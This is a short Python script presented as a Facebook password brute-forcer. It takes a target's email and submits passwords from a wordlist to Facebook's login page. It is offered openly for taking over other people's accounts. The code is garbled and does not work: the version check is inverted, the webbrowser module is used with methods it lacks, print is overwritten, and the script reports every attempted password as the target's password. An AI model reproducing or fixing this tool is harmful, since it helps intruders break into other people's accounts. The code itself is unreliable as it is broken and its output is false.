import sys
from ast import Break, Try
import webbrowser
import time
if sys.version_info[0] !=2: 
	print('''--------------------------------------
	REQUIRED PYTHON 3
	use: python3 fb.py
--------------------------------------
			''')
	Break
print('\n-------- follow on FB @CYBERHACKS6--------\n')

post_url='https://www.facebook.com/login.php'
headers = {
	'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
}


print('\n---------- Welcome To Facebook BruteForce ----------\n')
file=open('passwords.txt','r')

email = input("input Email of target:")
print ("\nTarget Email ID : ",email+"")
print ("\nTrying Passwords from list ")
i=0
while file:
	password=file.readline().strip()
	i+=1
	if len(password) < 6:
		continue
	print=str(i) +" : ",password
	response = webbrowser.open(post_url)
    
	if response: code = 200
	webbrowser.select_form(nr=0)()
	webbrowser.select['email']=email
	webbrowser.select['password']=password
	request=webbrowser.submit()
	response_data=response.read()
	'find friends' in response_data or 'two factor authentication' in response_data or 'security code' in  response_data;
	print("password of the target is: ",password)

	sys.exit